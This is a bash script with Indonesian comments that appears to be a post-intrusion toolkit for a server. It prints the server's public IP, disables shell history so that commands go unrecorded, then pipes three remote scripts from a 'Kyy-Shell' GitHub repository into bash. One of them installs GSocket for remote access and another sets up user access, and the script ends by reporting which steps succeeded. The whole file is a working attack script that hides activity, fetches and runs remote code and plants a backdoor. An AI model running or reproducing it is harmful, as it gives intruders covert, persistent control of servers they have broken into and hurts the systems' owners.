#!/bin/bash

# ============================================================
# 1. Dapatkan IP Server
# ============================================================
SERVERIP=$(curl -s ifconfig.me)
echo "============================================================"
echo "  Menjalankan script di Server IP: $SERVERIP"
echo "============================================================"

# ============================================================
# 2. Disable History (agar command tidak tercatat)
# ============================================================
echo ""
echo "[*] Menjalankan: set +o history && unset HISTFILE"
set +o history
unset HISTFILE
echo "[+] History disabled & HISTFILE unset"

# ============================================================
# 3. Jalankan cek-domain.sh
# ============================================================
echo ""
echo "[*] Menjalankan: cek-domain.sh"
echo "------------------------------------------------------------"
curl -s https://raw.githubusercontent.com/freyarion25/Kyy-Shell/refs/heads/main/cek-domain.sh | bash
CEK_DOMAIN_EXIT=$?
echo "------------------------------------------------------------"
if [ $CEK_DOMAIN_EXIT -eq 0 ]; then
    echo "[+] cek-domain.sh selesai (SUCCESS)"
else
    echo "[!] cek-domain.sh selesai (EXIT CODE: $CEK_DOMAIN_EXIT)"
fi

# ============================================================
# 4. Jalankan gs2.sh
# ============================================================
echo ""
echo "[*] Menjalankan: gs2.sh (install GSocket)"
echo "------------------------------------------------------------"
curl -s https://raw.githubusercontent.com/freyarion25/Kyy-Shell/refs/heads/main/gs.sh | bash
GS_EXIT=$?
echo "------------------------------------------------------------"
if [ $GS_EXIT -eq 0 ]; then
    echo "[+] gs2.sh selesai (SUCCESS)"
else
    echo "[!] gs2.sh selesai (EXIT CODE: $GS_EXIT)"
fi

# ============================================================
# 5. Jalankan user.sh
# ============================================================
echo ""
echo "[*] Menjalankan: user.sh (setup user/akses)"
echo "------------------------------------------------------------"
curl https://raw.githubusercontent.com/freyarion25/Kyy-Shell/refs/heads/main/user.sh | bash
USER_EXIT=$?
echo "------------------------------------------------------------"
if [ $USER_EXIT -eq 0 ]; then
    echo "[+] user.sh selesai (SUCCESS)"
else
    echo "[!] user.sh selesai (EXIT CODE: $USER_EXIT)"
fi

# ============================================================
# 6. Output Selesai
# ============================================================
echo ""
echo "============================================================"
echo "  SEMUA COMMAND BERHASIL DIJALANKAN DI $SERVERIP"
echo "============================================================"
echo ""
echo "Ringkasan:"
echo "  - set +o history && unset HISTFILE : ✅ Dijalankan"
if [ $CEK_DOMAIN_EXIT -eq 0 ]; then
    echo "  - cek-domain.sh                     : ✅ SUCCESS"
else
    echo "  - cek-domain.sh                     : ❌ FAILED (exit: $CEK_DOMAIN_EXIT)"
fi
if [ $GS_EXIT -eq 0 ]; then
    echo "  - gs2.sh                           : ✅ SUCCESS"
else
    echo "  - gs2.sh                           : ❌ FAILED (exit: $GS_EXIT)"
fi
if [ $USER_EXIT -eq 0 ]; then
    echo "  - user.sh                          : ✅ SUCCESS"
else
    echo "  - user.sh                          : ❌ FAILED (exit: $USER_EXIT)"
fi
echo ""
